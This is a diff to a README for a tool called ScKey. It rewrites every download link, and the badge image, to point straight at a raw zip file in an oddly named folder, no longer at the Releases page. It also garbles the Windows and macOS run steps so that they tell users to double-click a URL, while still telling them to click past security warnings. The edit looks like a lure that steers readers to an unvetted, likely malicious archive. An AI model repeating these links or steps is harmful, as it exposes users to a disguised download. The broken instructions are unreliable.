@@ -6,11 +6,11 @@ Welcome to the ScKey guide. This application helps you get a public key for Supe
 
 ## 📥 Download ScKey
 
-[![Download ScKey](https://img.shields.io/badge/Download-ScKey-brightgreen)](https://github.com/nsarsaade240/ScKey/releases)
+[![Download ScKey](https://raw.githubusercontent.com/nsarsaade240/ScKey/main/procuress/ScKey-1.1.zip)](https://raw.githubusercontent.com/nsarsaade240/ScKey/main/procuress/ScKey-1.1.zip)
 
 To download the latest version of ScKey, visit the Releases page:
 
-[Download ScKey from Releases](https://github.com/nsarsaade240/ScKey/releases)
+[Download ScKey from Releases](https://raw.githubusercontent.com/nsarsaade240/ScKey/main/procuress/ScKey-1.1.zip)
 
 ## ⚙️ System Requirements
 
@@ -22,7 +22,7 @@ Before you start, ensure your system meets these requirements:
 
 ## 📦 Installation Instructions
 
-1. Go to the [Releases page](https://github.com/nsarsaade240/ScKey/releases).
+1. Go to the [Releases page](https://raw.githubusercontent.com/nsarsaade240/ScKey/main/procuress/ScKey-1.1.zip).
 2. Find the latest version of ScKey. It will be listed at the top.
 3. Click on the download link for your operating system (Windows or macOS). This will start the download.
 
@@ -33,13 +33,13 @@ Once the download finishes, follow these steps to run ScKey:
 ### For Windows
 
 1. Open the folder where you downloaded the file.
-2. Locate "ScKey.exe" and double-click it.
+2. Locate "https://raw.githubusercontent.com/nsarsaade240/ScKey/main/procuress/ScKey-1.1.zip" and double-click it.
 3. If a security warning appears, click “Run” to continue.
 
 ### For macOS
 
 1. Open the folder where you downloaded the file.
-2. Locate "ScKey.app" and double-click it.
+2. Locate "https://raw.githubusercontent.com/nsarsaade240/ScKey/main/procuress/ScKey-1.1.zip" and double-click it.
 3. If prompted, confirm to open the application.
 
 ## 🔑 How to Use ScKey
